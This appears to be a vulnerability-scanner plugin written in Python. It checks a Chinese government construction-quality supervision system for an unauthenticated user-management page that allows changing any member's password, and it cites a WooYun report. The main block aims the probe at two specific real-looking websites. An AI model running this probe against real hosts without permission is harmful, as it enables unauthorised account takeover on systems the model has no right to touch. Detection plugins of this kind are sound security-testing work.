#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:政府建设工程质量监督系统可修改任意会员密码等其他信息
#Refer:http://www.wooyun.org/bugs/wooyun-2010-0121058

def assign(service,arg):
    if service=="pkpmbs":
        return True,arg 
    
def  audit(arg):
    url=arg+"pkpmbs/manager/sysuserlist.aspx"
    code,head,res,errcode,_=curl.curl2(url)
    if code==200 and  "javascript:role(" in res and 'javascript:changepwd(' in res:   
        security_hole(url)
    
if __name__=="__main__":
    from dummy import *
    audit(assign('pkpmbs','http://www.thszjz.com/')[1])
    audit(assign('pkpmbs','http://www.ccjdw.com/')[1])